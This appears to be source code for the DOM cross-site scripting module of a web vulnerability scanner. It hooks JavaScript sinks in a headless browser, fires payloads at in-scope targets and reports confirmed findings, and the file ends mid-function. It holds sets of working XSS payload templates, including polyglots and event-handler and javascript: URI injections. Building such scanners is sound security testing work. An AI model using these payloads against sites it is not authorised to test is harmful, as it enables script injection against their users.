#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <bcrypt.h>

#ifdef small
#undef small
#endif

#include "dom_xss_engine.hpp"
#include "camoufox_bridge.hpp"
#include "issue.hpp"
#include "scanner_module.hpp"
#include "scope.hpp"

#include "../../../helpers/diag_log.hpp"

#include <nlohmann/json.hpp>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <chrono>
#include <cstdint>
#include <filesystem>
#include <mutex>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

namespace aida {
namespace burp {
namespace dom_xss {

namespace {

std::mutex&   err_mtx()   { static std::mutex m; return m; }
std::string&  err_slot()  { static std::string s; return s; }

void set_err(const std::string& msg)
{
    std::lock_guard<std::mutex> lk(err_mtx());
    err_slot() = msg;
    diag::log_tagged("dom_xss", msg.c_str());
}

void clear_err()
{
    std::lock_guard<std::mutex> lk(err_mtx());
    err_slot().clear();
}

std::string current_err()
{
    std::lock_guard<std::mutex> lk(err_mtx());
    return err_slot();
}

uint64_t now_ms_steady()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(steady_clock::now().time_since_epoch()).count());
}

uint64_t now_ms_wall()
{
    using namespace std::chrono;
    return static_cast<uint64_t>(duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count());
}

std::atomic<bool>&     initialized_flag() { static std::atomic<bool> f{false}; return f; }
std::atomic<uint64_t>& last_scan_ms()     { static std::atomic<uint64_t> v{0}; return v; }
std::atomic<uint64_t>& sentinel_counter() { static std::atomic<uint64_t> v{0}; return v; }
std::mutex&            browser_global_mtx() { static std::mutex m; return m; }

std::string bytes_to_hex(const uint8_t* b, size_t n)
{
    static const char hex[] = "0123456789abcdef";
    std::string out;
    out.resize(n * 2);
    for (size_t i = 0; i < n; ++i) {
        out[i * 2 + 0] = hex[(b[i] >> 4) & 0xF];
        out[i * 2 + 1] = hex[b[i] & 0xF];
    }
    return out;
}

bool random_bytes(uint8_t* out, size_t n)
{
    NTSTATUS s = BCryptGenRandom(nullptr, out, static_cast<ULONG>(n), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    return s == 0;
}

std::string replace_all(std::string s, const std::string& from, const std::string& to)
{
    if (from.empty()) return s;
    size_t p = 0;
    while ((p = s.find(from, p)) != std::string::npos) {
        s.replace(p, from.size(), to);
        p += to.size();
    }
    return s;
}

std::string ascii_lower_copy(std::string s)
{
    for (char& c : s)
    {
        if (c >= 'A' && c <= 'Z') c = static_cast<char>(c + 32);
    }
    return s;
}

bool is_browser_transport_error(const std::string& msg)
{
    std::string s = ascii_lower_copy(msg);
    return s.find("connection closed while reading from the driver") != std::string::npos ||
           s.find("connection closed") != std::string::npos ||
           s.find("camoufox driver closed") != std::string::npos ||
           s.find("camoufox bridge not ready") != std::string::npos ||
           s.find("bridge state is busy") != std::string::npos ||
           s.find("target page, context or browser has been closed") != std::string::npos ||
           s.find("browser has been closed") != std::string::npos ||
           s.find("page has been closed") != std::string::npos ||
           s.find("target closed") != std::string::npos ||
           s.find("page crashed") != std::string::npos ||
           s.find("deadline exceeded") != std::string::npos ||
           s.find("add_init_script failed") != std::string::npos ||
           s.find("navigate failed") != std::string::npos ||
           s.find("harness navigate") != std::string::npos ||
           s.find("harness evaluate_js failed") != std::string::npos ||
           s.find("results read failed") != std::string::npos;
}

void recover_browser_transport(const char* phase, int attempt, const std::string& err)
{
    diag::log_tagged_fmt("dom_xss", "browser_transport_recover phase=%s attempt=%d err=%s",
        phase ? phase : "", attempt, err.c_str());
    camoufox::stop_bridge();
    std::this_thread::sleep_for(std::chrono::milliseconds(750 + (attempt * 500)));
}

std::string js_string_literal(const std::string& s)
{
    std::string out;
    out.reserve(s.size() + 2);
    out.push_back('"');
    for (unsigned char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"':  out += "\\\""; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    _snprintf_s(buf, sizeof(buf), _TRUNCATE, "\\u%04x", static_cast<unsigned>(c));
                    out += buf;
                } else {
                    out.push_back(static_cast<char>(c));
                }
                break;
        }
    }
    out.push_back('"');
    return out;
}

std::string make_screenshot_path(const std::string& tag)
{
    std::filesystem::path dir = std::filesystem::temp_directory_path() / "aida_dom_xss";
    std::error_code ec;
    std::filesystem::create_directories(dir, ec);
    std::string fname = "shot_" + tag + "_" + std::to_string(now_ms_wall()) + ".png";
    return (dir / fname).string();
}

struct request_line_t
{
    std::string method;
    std::string uri;
    std::string version;
    size_t      headers_offset = 0;
    bool        valid = false;
};

request_line_t parse_request_line_local(const std::string& raw)
{
    request_line_t out;
    auto eol = raw.find("\r\n");
    if (eol == std::string::npos) return out;
    auto sp1 = raw.find(' ');
    if (sp1 == std::string::npos || sp1 >= eol) return out;
    auto sp2 = raw.find(' ', sp1 + 1);
    if (sp2 == std::string::npos || sp2 >= eol) return out;
    out.method = raw.substr(0, sp1);
    out.uri    = raw.substr(sp1 + 1, sp2 - sp1 - 1);
    out.version = raw.substr(sp2 + 1, eol - sp2 - 1);
    out.headers_offset = eol + 2;
    out.valid = true;
    return out;
}

bool extract_host_header(const std::string& raw, size_t headers_offset, std::string& out_host)
{
    size_t p = headers_offset;
    auto body_sep = raw.find("\r\n\r\n", p);
    size_t end = (body_sep == std::string::npos) ? raw.size() : body_sep;
    while (p < end) {
        auto eol = raw.find("\r\n", p);
        if (eol == std::string::npos || eol > end) break;
        auto colon = raw.find(':', p);
        if (colon == std::string::npos || colon >= eol) { p = eol + 2; continue; }
        std::string name = raw.substr(p, colon - p);
        std::string lname; lname.reserve(name.size());
        for (char c : name) lname.push_back(static_cast<char>(std::tolower(static_cast<unsigned char>(c))));
        if (lname == "host") {
            size_t vs = colon + 1;
            while (vs < eol && (raw[vs] == ' ' || raw[vs] == '\t')) ++vs;
            size_t ve = eol;
            while (ve > vs && (raw[ve - 1] == ' ' || raw[ve - 1] == '\t')) --ve;
            out_host = raw.substr(vs, ve - vs);
            return true;
        }
        p = eol + 2;
    }
    return false;
}

std::string assemble_url_from_built(const std::vector<uint8_t>& built,
                                    const std::string&          fallback_scheme,
                                    uint16_t                    fallback_port)
{
    std::string raw(reinterpret_cast<const char*>(built.data()), built.size());
    auto rl = parse_request_line_local(raw);
    if (!rl.valid) return std::string();
    std::string host;
    if (!extract_host_header(raw, rl.headers_offset, host) || host.empty()) return std::string();
    std::string scheme = fallback_scheme.empty() ? std::string("http") : fallback_scheme;
    uint16_t port = fallback_port;
    if (port == 0) port = (scheme == "https") ? 443 : 80;
    auto colon_in_host = host.find(':');
    if (colon_in_host == std::string::npos) {
        if ((scheme == "https" && port != 443) || (scheme == "http" && port != 80)) {
            host += ":";
            host += std::to_string(port);
        }
    }
    std::string url;
    url.reserve(scheme.size() + 3 + host.size() + rl.uri.size());
    url += scheme;
    url += "://";
    url += host;
    if (rl.uri.empty() || rl.uri[0] != '/') url += '/';
    url += rl.uri;
    return url;
}

bool extract_method_path_body(const std::vector<uint8_t>& built,
                              std::string& out_method,
                              std::string& out_uri,
                              std::vector<std::pair<std::string, std::string>>& out_headers,
                              std::string& out_body)
{
    std::string raw(reinterpret_cast<const char*>(built.data()), built.size());
    auto rl = parse_request_line_local(raw);
    if (!rl.valid) return false;
    out_method = rl.method;
    out_uri = rl.uri;
    auto body_sep = raw.find("\r\n\r\n", rl.headers_offset);
    size_t end = (body_sep == std::string::npos) ? raw.size() : body_sep;
    size_t p = rl.headers_offset;
    while (p < end) {
        auto eol = raw.find("\r\n", p);
        if (eol == std::string::npos || eol > end) break;
        auto colon = raw.find(':', p);
        if (colon == std::string::npos || colon >= eol) { p = eol + 2; continue; }
        std::string name = raw.substr(p, colon - p);
        size_t vs = colon + 1;
        while (vs < eol && (raw[vs] == ' ' || raw[vs] == '\t')) ++vs;
        size_t ve = eol;
        while (ve > vs && (raw[ve - 1] == ' ' || raw[ve - 1] == '\t')) --ve;
        out_headers.emplace_back(std::move(name), raw.substr(vs, ve - vs));
        p = eol + 2;
    }
    if (body_sep != std::string::npos) {
        out_body.assign(raw.begin() + static_cast<std::ptrdiff_t>(body_sep + 4), raw.end());
    }
    return true;
}

std::string build_fetch_harness_js(const std::string& method,
                                   const std::string& abs_url,
                                   const std::vector<std::pair<std::string, std::string>>& headers,
                                   const std::string& body)
{
    nlohmann::json hdrs = nlohmann::json::object();
    for (const auto& kv : headers) {
        std::string lk; lk.reserve(kv.first.size());
        for (char c : kv.first) lk.push_back(static_cast<char>(std::tolower(static_cast<unsigned char>(c))));
        if (lk == "host" || lk == "content-length" || lk == "connection" ||
            lk == "transfer-encoding" || lk == "accept-encoding") continue;
        hdrs[kv.first] = kv.second;
    }
    bool has_body = !body.empty() && method != "GET" && method != "HEAD";
    std::ostringstream os;
    os << "(async function(){";
    os << "try{";
    os << "const r=await fetch(" << js_string_literal(abs_url) << ",{";
    os << "method:" << js_string_literal(method) << ",";
    os << "headers:" << hdrs.dump() << ",";
    os << "credentials:'omit',";
    os << "mode:'cors',";
    os << "redirect:'follow'";
    if (has_body) {
        os << ",body:" << js_string_literal(body);
    }
    os << "});";
    os << "const t=await r.text();";
    os << "document.open();";
    os << "document.write(t);";
    os << "document.close();";
    os << "return {ok:true,status:r.status,len:t.length};";
    os << "}catch(e){return {ok:false,error:String(e&&e.message?e.message:e)};}";
    os << "})();";
    return os.str();
}

std::string build_results_read_js(const sentinel_t& s)
{
    std::ostringstream os;
    os << "JSON.stringify(window[" << js_string_literal(s.results_global) << "]||[])";
    return os.str();
}

std::string trim_payload(const std::string& s, size_t max_chars)
{
    if (s.size() <= max_chars) return s;
    return s.substr(0, max_chars) + "...";
}

std::string normalize_sink_log_entry(const nlohmann::json& e)
{
    if (e.is_string()) return e.get<std::string>();
    if (!e.is_object()) return e.dump();
    std::string id = "?";
    std::string src = "inline";
    if (e.contains("id") && e["id"].is_string()) id = e["id"].get<std::string>();
    if (e.contains("src") && e["src"].is_string()) src = e["src"].get<std::string>();
    std::string out;
    out += id;
    out += " (";
    out += src;
    out += ")";
    return out;
}

issue_t make_browser_certain_issue(const std::string&        type_key,
                                   const std::string&        title,
                                   const insertion_point_t&  ip,
                                   const std::string&        payload_text,
                                   const fire_result_t&      r,
                                   const scan_options_t&     opts,
                                   const std::string&        path_hint)
{
    issue_t iss;
    iss.type_key = type_key;
    iss.name = title;
    iss.severity = severity_t::high;
    iss.confidence = confidence_t::certain;
    iss.scheme = opts.scheme.empty() ? std::string("http") : opts.scheme;
    iss.host = opts.host;
    iss.port = opts.port;
    iss.path = path_hint;
    iss.parameter = ip.name;
    iss.insertion_point = ip.kind + (ip.name.empty() ? std::string() : (":" + ip.name));
    iss.seen_ms = now_ms_wall();
    iss.audit_id = opts.audit_id;
    iss.description = std::string(
        "A JavaScript-execution payload was delivered into the '") + ip.name +
        "' parameter and fired one or more sentinel-hooked sinks inside a headless browser. "
        "This is a high-confidence confirmation that the parameter is exploitable for cross-site scripting; "
        "the recorded sink log enumerates every hook (alert, eval, Function, setTimeout(string), document.write, "
        ".innerHTML setter, location assignment, etc.) that was reached by the injected expression.";
    iss.remediation = "Apply context-aware output encoding at all sinks; deploy a strict Content-Security-Policy "
        "that disallows inline event handlers and 'unsafe-inline' scripts; sanitize any DOM data flowing into "
        "innerHTML / outerHTML / document.write / eval-family APIs.";
    iss.cwe.push_back("CWE-79");
    if (type_key == "xss.dom_browser_confirmed") iss.cwe.push_back("CWE-79.1");

    evidence_t ev;
    std::ostringstream req;
    req << "Payload delivered to: " << ip.kind << ":" << ip.name << "\r\n";
    req << "Sentinel firing payload (truncated to 800 chars):\r\n";
    req << trim_payload(payload_text, 800);
    ev.request_raw = req.str();

    std::ostringstream resp;
    resp << "Browser sink hooks fired (" << r.sink_log.size() << "):\r\n";
    for (const auto& e : r.sink_log) {
        resp << "  - " << e << "\r\n";
    }
    if (!r.last_screenshot_path.empty()) {
        resp << "Screenshot: " << r.last_screenshot_path << "\r\n";
    }
    ev.response_raw = resp.str();
    ev.marker = r.sink_log.empty() ? std::string("(no sink log)") : r.sink_log.front();
    iss.evidence.push_back(std::move(ev));
    return iss;
}

bool navigate_with_init_script(const std::string& abs_url,
                               const sentinel_t&  s,
                               int                timeout_ms)
{
    std::string pre = build_pre_injection_script(s);
    constexpr int kMaxAttempts = 3;
    for (int attempt = 1; attempt <= kMaxAttempts; ++attempt) {
        if (!camoufox::ensure_ready()) {
            std::string e = camoufox::last_error();
            if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
                set_err(e.empty() ? std::string("camoufox bridge not ready") : e);
                return false;
            }
            recover_browser_transport("ensure_ready", attempt, e);
            continue;
        }
        if (!camoufox::add_init_script(pre)) {
            std::string e = camoufox::last_error();
            diag::log_tagged_fmt("dom_xss", "add_init_script failed attempt=%d err=%s", attempt, e.c_str());
            if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
                set_err(std::string("add_init_script failed: ") + e);
                return false;
            }
            recover_browser_transport("add_init_script", attempt, e);
            continue;
        }
        if (camoufox::navigate(abs_url, "load", timeout_ms)) {
            return true;
        }
        std::string e = camoufox::last_error();
        diag::log_tagged_fmt("dom_xss", "navigate failed attempt=%d err=%s", attempt, e.c_str());
        if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
            set_err(std::string("navigate failed: ") + e);
            return false;
        }
        recover_browser_transport("navigate", attempt, e);
    }
    set_err("navigate failed: exhausted browser transport retries");
    return false;
}

bool drive_fetch_harness(const std::string& abs_url,
                         const std::vector<uint8_t>& built_req,
                         const sentinel_t& s,
                         int timeout_ms)
{
    std::string method;
    std::string uri;
    std::vector<std::pair<std::string, std::string>> headers;
    std::string body;
    if (!extract_method_path_body(built_req, method, uri, headers, body)) {
        set_err("harness: could not parse built request");
        return false;
    }
    std::string pre = build_pre_injection_script(s);
    constexpr int kMaxAttempts = 3;
    for (int attempt = 1; attempt <= kMaxAttempts; ++attempt) {
        if (!camoufox::ensure_ready()) {
            std::string e = camoufox::last_error();
            if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
                set_err(e.empty() ? std::string("camoufox bridge not ready") : e);
                return false;
            }
            recover_browser_transport("harness_ensure_ready", attempt, e);
            continue;
        }
        if (!camoufox::add_init_script(pre)) {
            std::string e = camoufox::last_error();
            diag::log_tagged_fmt("dom_xss", "add_init_script(harness) failed attempt=%d err=%s", attempt, e.c_str());
            if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
                set_err(std::string("add_init_script(harness) failed: ") + e);
                return false;
            }
            recover_browser_transport("harness_add_init_script", attempt, e);
            continue;
        }
        if (!camoufox::navigate("about:blank", "load", timeout_ms)) {
            std::string e = camoufox::last_error();
            diag::log_tagged_fmt("dom_xss", "harness navigate(about:blank) failed attempt=%d err=%s", attempt, e.c_str());
            if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
                set_err(std::string("harness navigate(about:blank) failed: ") + e);
                return false;
            }
            recover_browser_transport("harness_navigate", attempt, e);
            continue;
        }
        std::string js = build_fetch_harness_js(method, abs_url, headers, body);
        auto r = camoufox::evaluate_js(js, true);
        if (r.ok) {
            return true;
        }
        std::string e = r.error;
        if (!is_browser_transport_error(e) || attempt == kMaxAttempts) {
            set_err(std::string("harness evaluate_js failed: ") + e);
            return false;
        }
        recover_browser_transport("harness_evaluate_js", attempt, e);
    }
    set_err("harness failed: exhausted browser transport retries");
    return false;
}

std::vector<std::string> read_results(const sentinel_t& s)
{
    std::vector<std::string> out;
    std::string js = build_results_read_js(s);
    auto r = camoufox::evaluate_js(js, true);
    if (!r.ok) {
        diag::log_tagged_fmt("dom_xss", "results read failed: %s", r.error.c_str());
        set_err(std::string("results read failed: ") + r.error);
        return out;
    }
    nlohmann::json arr;
    bool parsed = false;
    if (r.data.is_array()) {
        arr = r.data;
        parsed = true;
    }
    if (!parsed && r.data.is_object()) {
        if (r.data.contains("result") && r.data["result"].is_array()) {
            arr = r.data["result"];
            parsed = true;
        } else if (r.data.contains("result") && r.data["result"].is_string()) {
            try { arr = nlohmann::json::parse(r.data["result"].get<std::string>()); parsed = true; } catch (...) {}
        } else if (r.data.contains("value") && r.data["value"].is_array()) {
            arr = r.data["value"];
            parsed = true;
        } else if (r.data.contains("value") && r.data["value"].is_string()) {
            try { arr = nlohmann::json::parse(r.data["value"].get<std::string>()); parsed = true; } catch (...) {}
        }
    }
    if (!parsed && r.data.is_string()) {
        try { arr = nlohmann::json::parse(r.data.get<std::string>()); parsed = true; } catch (...) {}
    }
    if (!parsed && !r.text.empty()) {
        try { arr = nlohmann::json::parse(r.text); parsed = true; } catch (...) {}
    }
    if (!parsed) {
        return out;
    }
    if (!arr.is_array()) return out;
    out.reserve(arr.size());
    for (const auto& e : arr) {
        out.push_back(normalize_sink_log_entry(e));
    }
    return out;
}

}

sentinel_t make_sentinel()
{
    diag::log_tagged_fmt("dom_xss", "make_sentinel entry");
    sentinel_t s;
    uint8_t buf[12] = {0};
    if (!random_bytes(buf, sizeof(buf))) {
        diag::log_tagged_fmt("dom_xss", "make_sentinel bcrypt_failed using_prng");
        std::mt19937_64 rng(static_cast<uint64_t>(now_ms_wall()) ^ sentinel_counter().fetch_add(1));
        for (size_t i = 0; i < sizeof(buf); ++i) buf[i] = static_cast<uint8_t>(rng() & 0xFF);
    }
    s.token = bytes_to_hex(buf, sizeof(buf));
    s.canary_fn      = std::string("__aida_xss_canary_")  + s.token + "__";
    s.results_global = std::string("__aida_xss_results_") + s.token + "__";
    diag::log_tagged_fmt("dom_xss", "make_sentinel done token=%s", s.token.c_str());
    return s;
}

std::string build_pre_injection_script(const sentinel_t& s)
{
    diag::log_tagged_fmt("dom_xss", "build_pre_injection_script entry token=%s", s.token.c_str());
    std::ostringstream os;
    os << "(function(){";
    os << "try{";
    os << "var RG=" << js_string_literal(s.results_global) << ";";
    os << "var CF=" << js_string_literal(s.canary_fn) << ";";
    os << "var TOK=" << js_string_literal(s.token) << ";";
    os << "if(!window[RG]){";
    os <<   "Object.defineProperty(window,RG,{value:[],writable:false,configurable:false,enumerable:false});";
    os << "}";
    os << "var push=function(id,src){try{window[RG].push({id:id,src:String(src||'inline').slice(0,400),t:Date.now()});}catch(e){}};";
    os << "if(!window[CF]){";
    os <<   "Object.defineProperty(window,CF,{value:push,writable:false,configurable:false,enumerable:false});";
    os << "}";

    os << "var stub=function(label){return function(){try{var a=arguments;var s=(a.length>0)?String(a[0]).slice(0,200):'';push(label+':'+TOK,s);}catch(e){}};};";

    os << "var def=function(obj,name,val){try{Object.defineProperty(obj,name,{value:val,writable:false,configurable:false,enumerable:false});}catch(e){try{obj[name]=val;}catch(e2){}}};";

    os << "def(window,'alert',stub('alert'));";
    os << "def(window,'confirm',stub('confirm'));";
    os << "def(window,'prompt',stub('prompt'));";
    os << "def(window,'print',stub('print'));";

    os << "try{";
    os <<   "var origEval=window.eval;";
    os <<   "window.eval=function(x){push('eval:'+TOK,String(x).slice(0,200));try{return origEval.call(window,x);}catch(e){return undefined;}};";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var OrigFunc=window.Function;";
    os <<   "var NewFunc=function(){var args=Array.prototype.slice.call(arguments);push('Function:'+TOK,args.join('|').slice(0,200));try{return OrigFunc.apply(this,args);}catch(e){return function(){};}};";
    os <<   "NewFunc.prototype=OrigFunc.prototype;";
    os <<   "window.Function=NewFunc;";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var oST=window.setTimeout;";
    os <<   "window.setTimeout=function(f,t){if(typeof f==='string'){push('setTimeout-str:'+TOK,String(f).slice(0,200));}return oST.apply(window,arguments);};";
    os <<   "var oSI=window.setInterval;";
    os <<   "window.setInterval=function(f,t){if(typeof f==='string'){push('setInterval-str:'+TOK,String(f).slice(0,200));}return oSI.apply(window,arguments);};";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var oDW=document.write;";
    os <<   "document.write=function(){var s=Array.prototype.join.call(arguments,'');push('document.write:'+TOK,String(s).slice(0,200));return oDW.apply(document,arguments);};";
    os <<   "var oDWL=document.writeln;";
    os <<   "document.writeln=function(){var s=Array.prototype.join.call(arguments,'');push('document.writeln:'+TOK,String(s).slice(0,200));return oDWL.apply(document,arguments);};";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var EP=Element.prototype;";
    os <<   "var orig=Object.getOwnPropertyDescriptor(EP,'innerHTML');";
    os <<   "if(orig&&orig.set){";
    os <<     "var oSet=orig.set;";
    os <<     "Object.defineProperty(EP,'innerHTML',{configurable:true,enumerable:true,";
    os <<       "get:orig.get,";
    os <<       "set:function(v){push('innerHTML:'+TOK,String(v).slice(0,200));return oSet.call(this,v);}";
    os <<     "});";
    os <<   "}";
    os <<   "var origOuter=Object.getOwnPropertyDescriptor(EP,'outerHTML');";
    os <<   "if(origOuter&&origOuter.set){";
    os <<     "var oSetO=origOuter.set;";
    os <<     "Object.defineProperty(EP,'outerHTML',{configurable:true,enumerable:true,";
    os <<       "get:origOuter.get,";
    os <<       "set:function(v){push('outerHTML:'+TOK,String(v).slice(0,200));return oSetO.call(this,v);}";
    os <<     "});";
    os <<   "}";
    os <<   "var origInsertAdj=EP.insertAdjacentHTML;";
    os <<   "if(origInsertAdj){";
    os <<     "EP.insertAdjacentHTML=function(pos,html){push('insertAdjacentHTML:'+TOK,String(html).slice(0,200));return origInsertAdj.call(this,pos,html);};";
    os <<   "}";
    os <<   "var origSetAttr=EP.setAttribute;";
    os <<   "if(origSetAttr){";
    os <<     "EP.setAttribute=function(n,v){try{if(typeof n==='string'&&n.length>2&&n.slice(0,2).toLowerCase()==='on'){push('setAttribute('+n+'):'+TOK,String(v).slice(0,200));}}catch(e){}return origSetAttr.call(this,n,v);};";
    os <<   "}";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var origHrefDesc=Object.getOwnPropertyDescriptor(Location.prototype,'href');";
    os <<   "if(origHrefDesc&&origHrefDesc.set){";
    os <<     "var oHrefSet=origHrefDesc.set;";
    os <<     "Object.defineProperty(Location.prototype,'href',{configurable:true,enumerable:true,";
    os <<       "get:origHrefDesc.get,";
    os <<       "set:function(v){try{var sv=String(v);if(sv.toLowerCase().indexOf('javascript:')===0){push('location.href-javascript:'+TOK,sv.slice(0,200));}else{push('location.href:'+TOK,sv.slice(0,200));}}catch(e){}return oHrefSet.call(this,v);}";
    os <<     "});";
    os <<   "}";
    os <<   "var origAssign=Location.prototype.assign;";
    os <<   "if(origAssign){";
    os <<     "Location.prototype.assign=function(v){try{var sv=String(v);if(sv.toLowerCase().indexOf('javascript:')===0){push('location.assign-javascript:'+TOK,sv.slice(0,200));}else{push('location.assign:'+TOK,sv.slice(0,200));}}catch(e){}return origAssign.call(this,v);};";
    os <<   "}";
    os <<   "var origReplace=Location.prototype.replace;";
    os <<   "if(origReplace){";
    os <<     "Location.prototype.replace=function(v){try{var sv=String(v);if(sv.toLowerCase().indexOf('javascript:')===0){push('location.replace-javascript:'+TOK,sv.slice(0,200));}else{push('location.replace:'+TOK,sv.slice(0,200));}}catch(e){}return origReplace.call(this,v);};";
    os <<   "}";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var origCreate=document.createElement;";
    os <<   "document.createElement=function(name){var el=origCreate.call(document,name);try{if(typeof name==='string'){var ln=name.toLowerCase();if(ln==='script'){var origSrcDesc=Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype,'src');if(origSrcDesc&&origSrcDesc.set){Object.defineProperty(el,'src',{configurable:true,enumerable:true,get:origSrcDesc.get,set:function(v){push('script.src:'+TOK,String(v).slice(0,200));return origSrcDesc.set.call(this,v);}});}}else if(ln==='iframe'){var origSrcDoc=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'srcdoc');if(origSrcDoc&&origSrcDoc.set){Object.defineProperty(el,'srcdoc',{configurable:true,enumerable:true,get:origSrcDoc.get,set:function(v){push('iframe.srcdoc:'+TOK,String(v).slice(0,200));return origSrcDoc.set.call(this,v);}});}}}}catch(e){}return el;};";
    os << "}catch(e){}";

    os << "try{";
    os <<   "if(window.jQuery&&window.jQuery.fn){";
    os <<     "var origHtml=window.jQuery.fn.html;";
    os <<     "window.jQuery.fn.html=function(v){if(arguments.length>0){push('jQuery.html:'+TOK,String(v).slice(0,200));}return origHtml.apply(this,arguments);};";
    os <<     "var origAppend=window.jQuery.fn.append;";
    os <<     "window.jQuery.fn.append=function(){try{var s='';for(var i=0;i<arguments.length;++i)s+=String(arguments[i]);push('jQuery.append:'+TOK,s.slice(0,200));}catch(e){}return origAppend.apply(this,arguments);};";
    os <<   "}";
    os << "}catch(e){}";

    os << "try{";
    os <<   "var origPostMessage=window.postMessage;";
    os <<   "window.postMessage=function(){try{push('postMessage:'+TOK,String(arguments[0]).slice(0,200));}catch(e){}return origPostMessage.apply(this,arguments);};";
    os << "}catch(e){}";

    os << "}catch(outer){try{console.log('aida_xss init err:'+(outer&&outer.message?outer.message:outer));}catch(e){}}";
    os << "})();";
    std::string script = os.str();
    diag::log_tagged_fmt("dom_xss", "build_pre_injection_script done script_len=%zu", script.size());
    return script;
}

std::vector<payload_set_t> default_payload_sets()
{
    diag::log_tagged_fmt("dom_xss", "default_payload_sets entry");
    std::vector<payload_set_t> sets;

    payload_set_t polyglot;
    polyglot.name = "polyglot";
    polyglot.templates = {
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={CANARY_FN}('polyglot1') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd={CANARY_FN}('polyglot1b')//>",
        "\">'><img src=x id=p2 onerror={CANARY_FN}('polyglot2')>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{CANARY_FN}(\"polyglot3\")//'>",
        "';alert(1);{CANARY_FN}('polyglot4');//'\"</script>{CANARY_FN}('polyglot4b');//",
        "<svg><script>123<1>{CANARY_FN}('polyglot5')</script>",
        "</noscript></style></title></textarea></iframe><img src=1 onerror={CANARY_FN}('polyglot6')>"
    };
    sets.push_back(std::move(polyglot));

    payload_set_t standard;
    standard.name = "standard";
    standard.templates = {
        "<script>{CANARY_FN}('s1')</script>",
        "<img src=x onerror={CANARY_FN}('s2')>",
        "<svg onload={CANARY_FN}('s3')>",
        "<iframe srcdoc='<script>parent.{CANARY_FN}(&quot;s4&quot;)</script>'></iframe>",
        "\"><script>{CANARY_FN}('s5')</script>",
        "';{CANARY_FN}('s6');//",
        "\"-{CANARY_FN}('s7')-\"",
        "<body onload={CANARY_FN}('s8')>",
        "<details ontoggle={CANARY_FN}('s9') open>",
        "<marquee onstart={CANARY_FN}('s10')>",
        "<input autofocus onfocus={CANARY_FN}('s11')>",
        "<a href=\"javascript:{CANARY_FN}('s12')\">x</a>"
    };
    sets.push_back(std::move(standard));

    payload_set_t dom_only;
    dom_only.name = "dom_only";
    dom_only.templates = {
        "#javascript:{CANARY_FN}('h1')",
        "?q=<svg onload={CANARY_FN}('q1')>",
        "\"</script><script>{CANARY_FN}('q2')</script>",
        "<img/src=`x`/onerror={CANARY_FN}('d1')>",
        "<svg><animate onbegin={CANARY_FN}('d2') attributeName=x dur=1s>",
        "<object data=\"javascript:{CANARY_FN}('d3')\">",
        "<form><button formaction=\"javascript:{CANARY_FN}('d4')\">x</button></form>"
    };
    sets.push_back(std::move(dom_only));

    diag::log_tagged_fmt("dom_xss", "default_payload_sets done sets=%zu", sets.size());
    return sets;
}

fire_result_t fire_payload(const insertion_point_t& ip,
                           const std::string&       payload_template,
                           const sentinel_t&        s,
                           bool                     capture_screenshot,
                           int                      per_payload_timeout_ms,
                           const std::string&       scheme_hint,
                           uint16_t                 port_hint)
{
    std::lock_guard<std::mutex> global_lk(browser_global_mtx());
    fire_result_t out;
    clear_err();

    if (!camoufox::ensure_ready()) {
        out.error = "camoufox bridge not ready";
        set_err(out.error);
        return out;
    }
    if (!ip.build) {
        out.error = "insertion_point has no build()";
        set_err(out.error);
        return out;
    }

    std::string canary_fn_literal = js_string_literal(s.canary_fn);
    std::string payload = replace_all(payload_template, "{CANARY_FN_LIT}", canary_fn_literal);
    payload = replace_all(payload, "{CANARY_FN}", s.canary_fn);
    payload = replace_all(payload, "{CANARY}",     s.token);

    auto built = ip.build(payload);
    if (built.empty()) {
        out.error = "ip.build returned empty";
        set_err(out.error);
        return out;
    }

    std::string scheme = scheme_hint;
    std::string host;
    uint16_t    port = port_hint;
    {
        std::string raw(reinterpret_cast<const char*>(built.data()), built.size());
        auto rl = parse_request_line_local(raw);
        if (!rl.valid) {
            out.error = "failed to parse built request line";
            set_err(out.error);
            return out;
        }
        std::string host_header;
        extract_host_header(raw, rl.headers_offset, host_header);
        if (!host_header.empty()) {
            auto colon = host_header.find(':');
            host = (colon == std::string::npos) ? host_header : host_header.substr(0, colon);
            if (colon != std::string::npos) {
                try {
                    uint16_t parsed = static_cast<uint16_t>(std::stoul(host_header.substr(colon + 1)));
                    if (parsed != 0) port = parsed;
                } catch (...) {}
            }
        }
        if (scheme.empty()) scheme = "http";
        if (port == 0) port = (scheme == "https") ? 443 : 80;
    }

    {
        std::string check;
        check += scheme;
        check += "://";
        check += host;
        check += "/";
        if (!scope::in_scope(check)) {
            std::string alt = (scheme == "https") ? std::string("http://") : std::string("https://");
            std::string alt_check = alt + host + "/";
            if (!scope::in_scope(alt_check)) {
                out.error = "target out of scope";
                diag::log_tagged_fmt("dom_xss", "scope deny: %s", host.c_str());
                return out;
            } else {
                scheme = (scheme == "https") ? std::string("http") : std::string("https");
                if (scheme == "https" && (port == 80 || port == 0)) port = 443;
